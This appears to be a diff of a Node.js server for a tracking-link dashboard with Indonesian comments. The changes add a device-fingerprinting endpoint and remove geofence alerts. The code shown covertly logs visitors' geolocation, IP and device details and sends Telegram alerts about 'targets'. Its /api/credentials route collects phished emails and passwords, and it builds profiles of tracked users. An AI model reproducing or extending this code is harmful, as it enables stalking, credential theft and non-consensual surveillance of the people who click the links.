@@ -1,4 +1,4 @@
-// File: server.js (v9.3 - QR Code Feature Removed)
+// File: server.js (v9.4 - Universal Trap & Fingerprinting)
 
 require('dotenv').config();
 
@@ -24,10 +24,11 @@ const PORT = process.env.PORT || 4000;
 const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({limit: '5mb'})); // Tingkatkan limit untuk data fingerprint
 app.use(requestIp.mw());
 app.use(express.static(__dirname));
 
+// ... (Kode untuk protectRoute, sendTelegramNotification, broadcastDashboardUpdate, dll. tetap sama) ...
 const protectRoute = (req, res, next) => {
     try {
         const token = req.headers.authorization?.split(" ")[1];
@@ -53,7 +54,6 @@ const sendTelegramNotification = async (message) => {
 
 const broadcastDashboardUpdate = async (socket = null) => {
     try {
-        // --- [DIHAPUS] Kolom 'short_id' sudah tidak diambil lagi ---
         const linksQuery = `
             SELECT 
                 l.id, l.original_url, l.created_at, l.expires_at, l.link_type, 
@@ -129,6 +129,7 @@ app.get('/', (req, res) => {
     res.redirect('/login.html');
 });
 
+// ... (Route /login dan /:id tetap sama) ...
 app.post('/login', async (req, res) => {
     const { username, password } = req.body;
     try {
@@ -148,12 +149,8 @@ app.post('/login', async (req, res) => {
         res.status(500).json({ message: 'Server error' });
     }
 });
-
-// --- [DIHAPUS] Route /s/:shortId untuk QR Code sudah tidak ada ---
-
 app.get('/:id', async (req, res, next) => {
     const { id } = req.params;
-    // Cek jika ID mengandung ekstensi file untuk mencegah konflik dengan file statis
     if (path.extname(id)) {
         return next();
     }
@@ -191,48 +188,26 @@ app.get('/:id', async (req, res, next) => {
     }
 });
 
-// ... (Sisa kode seperti haversineDistance, checkGeofences, /log, /api/credentials tetap SAMA) ...
-const haversineDistance = (coords1, coords2) => {
-    function toRad(x) { return x * Math.PI / 180; }
-    const R = 6371e3;
-    const dLat = toRad(coords2.lat - coords1.lat);
-    const dLon = toRad(coords2.lon - coords1.lon);
-    const lat1 = toRad(coords1.lat);
-    const lat2 = toRad(coords2.lat);
-    const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.sin(dLon / 2) * Math.sin(dLon / 2) * Math.cos(lat1) * Math.cos(lat2);
-    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-    return R * c;
-};
-async function checkGeofences(locationData) {
-    try {
-        const [fences] = await db.query('SELECT * FROM geofences');
-        for (const fence of fences) {
-            const distance = haversineDistance(
-                { lat: locationData.latitude, lon: locationData.longitude },
-                { lat: fence.lat, lon: fence.lon }
-            );
-            if (distance <= fence.radius) {
-                console.log(`🚨 Geofence breached by ${locationData.username} at ${fence.name}`);
-                const alertData = {
-                    username: locationData.username,
-                    fenceName: fence.name,
-                    location: { city: locationData.city, country: locationData.country },
-                    timestamp: new Date()
-                };
-                io.emit('geofence_alert', alertData);
-                const message = `
-*🚨 GEOFENCE ALERT! 🚨*
-*Target:* \`${alertData.username}\`
-*Telah Memasuki Area:* \`${alertData.fenceName}\`
-*Lokasi Terdeteksi:* ${alertData.location.city || 'N/A'}, ${alertData.location.country || 'N/A'}
-                `;
-                await sendTelegramNotification(message);
-            }
-        }
-    } catch (error) {
-        console.error("Error checking geofences:", error);
+
+// --- [ENDPOINT BARU] Untuk menyimpan data fingerprint ---
+app.post('/api/fingerprint', async (req, res) => {
+    const { trackerId, fingerprintHash, details } = req.body;
+    if (!trackerId || !fingerprintHash || !details) {
+        return res.status(400).json({ status: 'error', message: 'Data tidak lengkap.' });
     }
-}
+    try {
+        await db.query('INSERT INTO fingerprints (tracker_id, fingerprint_hash, details) VALUES (?, ?, ?)', [trackerId, fingerprintHash, JSON.stringify(details)]);
+        broadcastLogMessage(`> 🔬 Fingerprint [${fingerprintHash}] diambil dari link [${trackerId}]`);
+        sendTelegramNotification(`*🔬 Device Fingerprinted!* \n*Link ID:* \`${trackerId}\` \n*Hash:* \`${fingerprintHash}\``);
+        res.json({ status: 'success' });
+    } catch (error) {
+        console.error("Error saving fingerprint:", error);
+        res.status(500).json({ status: 'error', message: 'Gagal menyimpan fingerprint.' });
+    }
+});
+
+
+// ... (Sisa kode seperti /log dan lainnya tetap SAMA) ...
 app.post('/log', async (req, res) => {
     const { latitude, longitude, trackerId, username } = req.body;
     const userAgentString = req.headers['user-agent'];
@@ -273,7 +248,7 @@ app.post('/log', async (req, res) => {
         const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
         const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
         
-        broadcastLogMessage(`> Location from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
+        broadcastLogMessage(`> 📍 Lokasi dari [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
         
         const telegramMessage = `
 *💀 Target Terdeteksi! 💀*
@@ -289,13 +264,14 @@ app.post('/log', async (req, res) => {
         
         broadcastDashboardUpdate();
         
-        await checkGeofences({ ...newLocation, username });
+        // await checkGeofences({ ...newLocation, username });
         res.json({ status: 'success' });
     } catch (error) {
         console.error("Error logging location:", error);
         res.status(500).json({ status: 'error' });
     }
 });
+// ... (sisa file tidak berubah) ...
 app.post('/api/credentials', async (req, res) => {
     const { email, password, trackerId } = req.body;
     const ipAddress = req.clientIp;
@@ -323,11 +299,9 @@ app.post('/api/credentials', async (req, res) => {
         res.status(500).json({ message: 'Error saving credentials.' });
     }
 });
-
 app.post('/create', protectRoute, async (req, res) => {
     const { username, originalUrl, url_android, url_ios, expiresIn, linkType } = req.body;
     if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
-
     let ogData = { og_title: null, og_description: null, og_image: null };
     try {
         const response = await axios.get(originalUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' } });
@@ -343,13 +317,11 @@ app.post('/create', protectRoute, async (req, res) => {
     } catch (error) {
         console.warn(`⚠️ Gagal mengambil OG data dari ${originalUrl}: ${error.message}`);
     }
-
     let expiresAt = null;
     if (expiresIn && !isNaN(parseInt(expiresIn))) {
         expiresAt = new Date();
         expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
     }
-
     try {
         let [users] = await db.query('SELECT id FROM users WHERE username = ?', [username]);
         let userId;
@@ -359,7 +331,6 @@ app.post('/create', protectRoute, async (req, res) => {
             const [result] = await db.query('INSERT INTO users (username, is_admin) VALUES (?, FALSE) ON DUPLICATE KEY UPDATE id=LAST_INSERT_ID(id)', [username]);
             userId = result.insertId;
         }
-
         let id;
         try {
             const url = new URL(originalUrl);
@@ -375,7 +346,6 @@ app.post('/create', protectRoute, async (req, res) => {
             if (fullSlug.length > 250) {
                 fullSlug = fullSlug.substring(0, 250);
             }
-
             const [existingLink] = await db.query('SELECT id FROM links WHERE id = ?', [fullSlug]);
             if (existingLink.length > 0) {
                 id = `${fullSlug}-${nanoid(4)}`;
@@ -387,7 +357,6 @@ app.post('/create', protectRoute, async (req, res) => {
             id = nanoid(8);
         }
         
-        // --- [DIHAPUS] Logika pembuatan 'short_id' sudah tidak ada ---
         const newLinkData = { id, user_id: userId, original_url: originalUrl, url_android: url_android || null, url_ios: url_ios || null, expires_at: expiresAt, link_type: linkType || 'direct', ...ogData };
         
         await db.query('INSERT INTO links SET ?', newLinkData);
@@ -400,12 +369,10 @@ app.post('/create', protectRoute, async (req, res) => {
         res.status(500).json({ error: 'DB error', message: error.sqlMessage || error.message });
     }
 });
-
-// ... (Sisa kode API routes lainnya tetap sama) ...
 app.delete('/api/links/:id', protectRoute, async (req, res) => {
     const { id } = req.params;
     try {
-        await db.query("DELETE FROM links WHERE id = ?", [id]); // ON DELETE CASCADE akan menangani sisanya
+        await db.query("DELETE FROM links WHERE id = ?", [id]);
         broadcastLogMessage(`> Link [${id}] dan semua data terkait telah dihapus.`);
         broadcastDashboardUpdate();
         res.json({ status: 'success', message: 'Link berhasil dihapus.' });
@@ -490,32 +457,6 @@ app.get('/api/intel/:username', protectRoute, async (req, res) => {
         res.json(analysisResult);
     } catch (error) {
         res.status(500).json({ error: 'Server error during analysis' });
-    }
-});
-app.get('/api/geofences', protectRoute, async (req, res) => {
-    try {
-        const [fences] = await db.query('SELECT * FROM geofences ORDER BY name ASC');
-        res.json(fences);
-    } catch (error) {
-        res.status(500).json({ message: 'Failed to fetch geofences' });
-    }
-});
-app.post('/api/geofences', protectRoute, async (req, res) => {
-    const { name, lat, lon, radius } = req.body;
-    if (!name || !lat || !lon || !radius) { return res.status(400).json({ message: 'All fields are required' }); }
-    try {
-        await db.query('INSERT INTO geofences (name, lat, lon, radius) VALUES (?, ?, ?, ?)', [name, lat, lon, radius]);
-        res.status(201).json({ message: 'Geofence created' });
-    } catch (error) {
-        res.status(500).json({ message: 'Failed to create geofence' });
-    }
-});
-app.delete('/api/geofences/:id', protectRoute, async (req, res) => {
-    try {
-        await db.query('DELETE FROM geofences WHERE id = ?', [req.params.id]);
-        res.json({ message: 'Geofence deleted' });
-    } catch (error) {
-        res.status(500).json({ message: 'Failed to delete geofence' });
     }
 });
 app.get('/api/alldata/links', protectRoute, async (req, res) => {
@@ -618,7 +559,7 @@ app.delete('/api/alldata/all', protectRoute, async (req, res) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`\n HACKER-UI DASHBOARD v9.3 (QR Removed)`);
+    console.log(`\n HACKER-UI DASHBOARD v9.4 (Universal Trap)`);
     console.log(`===================================================`);
     console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
 });
